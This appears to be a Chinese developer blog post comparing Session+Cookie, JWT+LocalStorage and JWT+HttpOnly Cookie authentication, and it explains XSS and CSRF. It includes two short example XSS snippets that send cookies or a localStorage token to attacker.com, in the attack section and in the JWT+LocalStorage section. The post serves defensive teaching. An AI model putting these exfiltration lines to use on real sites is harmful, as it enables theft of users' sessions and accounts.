---
title: 登录注册-认证方案
published: 2026-06-20
description: '开发中认证的方案'
tags: [ 'Cookie','Session','JWT']
category: 项目开发
draft: false
---

# 前言

我在最近的项目写登录注册的时候，选择的是 JWT+Cookie 的方式进行认证。在之前我一直用的是 JWT+LocalStorage 的方案。所以我想借此机会深入了解一下在开发中，认证的几种方案，以及过程中我遇到的问题。

# 认证的必要性

在互联网应用中，用户认证是保障系统安全的第一道防线。没有可靠的认证机制，会导致以下风险：

- **隐私泄露**：用户个人信息被非法访问
- **数据篡改**：攻击者以他人身份操作数据
- **财产损失**：涉及金钱的应用尤其危险
- **信任损害**：安全事件严重影响用户对产品的信任

## 常见的网络攻击

### XSS（跨站脚本攻击）

攻击者通过在页面注入恶意脚本，当其他用户访问时，脚本会读取其 Cookie、Token 等敏感信息。

```javascript
// 恶意脚本示例
document.write('<img src="http://attacker.com?cookie=' + document.cookie + '">');
```

### CSRF（跨站请求伪造）

攻击者诱导用户访问恶意页面，该页面自动以用户的身份发起请求，利用用户已登录的状态完成攻击。

### Token 盗取

通过 XSS 或其他手段获取存储在 localStorage 中的 Token。

# 认证的三种方案

## 什么是 Session

Session（会话）是服务器端存储的用户会话数据。当用户登录成功后，服务器创建一个唯一的 Session ID，并将其返回给客户端。

**工作流程：**
1. 用户登录，服务器验证身份
2. 服务器创建 Session，存储用户信息
3. 服务器返回 Session ID（通常通过 Cookie 传递）
4. 后续请求，浏览器自动携带 Cookie
5. 服务器通过 Session ID 查找用户信息

**特点：**
- 数据存储在服务器端，安全性高
- 需要服务器存储空间
- 依赖 Cookie 传递 Session ID

## 什么是 Cookie

Cookie 是浏览器提供的存储机制，用于存储键值对数据。

**重要属性：**

| 属性 | 说明 |
|------|------|
| `name=value` | 存储的数据 |
| `HttpOnly` | 是否允许 JavaScript 访问（防 XSS） |
| `Secure` | 是否仅在 HTTPS 连接时发送 |
| `SameSite` | 防止 CSRF 攻击 |
| `Expires/Max-Age` | 过期时间 |

## 什么是 JWT

JWT（JSON Web Token）是一种开放标准，用于在各方之间安全地传输信息。

**结构：**

```
header.payload.signature
```

```javascript
// 示例 JWT
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NTYiLCJpYXQiOjE3MTkwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**组成：**
- **Header**：包含令牌类型和签名算法
- **Payload**：包含声明（claims），如用户 ID、过期时间
- **Signature**：使用密钥对前两部分签名，确保数据完整性

## 新手误解 Session/SessionStorage

| 存储位置 | 存储内容 | 生命周期 | 访问限制 |
|----------|----------|----------|----------|
| Session | 服务器端的会话数据 | 服务器决定 | 仅服务器可访问 |
| SessionStorage | 浏览器端的键值对 | 标签页关闭后清除 | 仅当前标签页可访问 |
| LocalStorage | 浏览器端的键值对 | 永久（手动清除） | 同源所有标签页共享 |

**常见误解：**
- ❌ SessionStorage 是 Session 的客户端存储
- ❌ Session 可以像 LocalStorage 一样在浏览器查看
- ✅ Session 完全由服务器管理，客户端只持有 ID

# Session + Cookie（传统方案）

这是最经典的身份认证方案，历史悠久，广泛应用于传统 Web 应用。

**工作流程：**

```
用户登录 → 服务器验证 → 创建 Session → 返回 Cookie(SessionId)
                                      ↓
浏览器请求 → 自动携带 Cookie → 服务器验证 SessionId → 获取用户信息 → 处理请求
```

**优缺点：**

| 优点 | 缺点 |
|------|------|
| 服务器控制，安全性高 | 服务器压力大（需要存储 Session） |
| 适合分布式部署 | 需要额外的存储介质（Redis/Memcached） |
| 可快速销毁会话 | 依赖 Cookie，限制跨域场景 |

**适用场景：** 传统的服务端渲染应用（如电商后台、cms 系统）

# JWT + LocalStorage

前端单页应用（SPA）时代的主流方案之一。

**工作流程：**

```
用户登录 → 服务器验证 → 生成 JWT → 返回给前端
                                      ↓
前端存储到 LocalStorage → 后续请求放在 Authorization Header
                          Authorization: Bearer <token>
```

**优缺点：**

| 优点 | 缺点 |
|------|------|
| 无状态，服务器压力小 | Token 存储在 LocalStorage，易受 XSS 攻击 |
| 跨域友好 | 无法主动失效（只能等过期） |
| 适合移动端和前后端分离 | Token 体积较大，增加请求负担 |

**安全问题：**

```javascript
// XSS 攻击可能窃取 Token
const stolen = localStorage.getItem('token');
// 发送给攻击者服务器
fetch('http://attacker.com?token=' + stolen);
```

# JWT + HttpOnly Cookie（推荐方案）

这是目前较为安全的方案，结合了两者的优点。

**工作流程：**

```
用户登录 → 服务器验证 → 生成 JWT → 设置 HttpOnly Cookie（Secure + SameSite）
                                      ↓
浏览器请求 → 自动携带 Cookie（JavaScript 无法访问）→ 服务器验证 → 处理请求
```

**安全措施：**

```http
Set-Cookie: token=eyJhbG...; HttpOnly; Secure; SameSite=Strict; Path=/
```

| 属性 | 作用 |
|------|------|
| `HttpOnly` | 防止 JavaScript 访问，无法被 XSS 窃取 |
| `Secure` | 仅在 HTTPS 连接时传输 |
| `SameSite=Strict` | 完全禁止跨站请求携带 |
| `SameSite=Lax` | 允许导航请求携带，阻止 POST 等请求 |

**优缺点：**

| 优点 | 缺点 |
|------|------|
| 安全性高，防 XSS | 配置相对复杂 |
| 无需前端存储 | 依赖 Cookie，跨域需特殊处理 |
| 自动随请求发送 | Token 刷新策略需要单独处理 |

**适用场景：** 前后端分离应用、对安全性要求高的系统

# 总结

## 方案对比

| 方案 | 安全性 | 复杂度 | 服务器压力 | 适用场景 |
|------|--------|--------|------------|----------|
| Session + Cookie | ⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐⭐ | 传统服务端渲染应用 |
| JWT + LocalStorage | ⭐⭐ | ⭐⭐ | ⭐⭐ | 快速原型、演示项目 |
| JWT + HttpOnly Cookie | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐ | 前后端分离应用（推荐） |

## 实践建议

1. **优先选择 HttpOnly Cookie**：除非有特殊需求，否则不要把 Token 放在 LocalStorage
2. **做好 XSS 防护**：即使使用 HttpOnly Cookie，前端代码也要防止 XSS
3. **合理设置 Token 有效期**：Access Token 短一些，Refresh Token 可以长一些
4. **敏感操作二次验证**：修改密码、支付等操作建议额外验证
5. **做好日志记录**：登录、登出、异常访问都需要记录

希望这篇文章能帮助你理解认证方案的区别和适用场景。如果有问题，欢迎讨论！
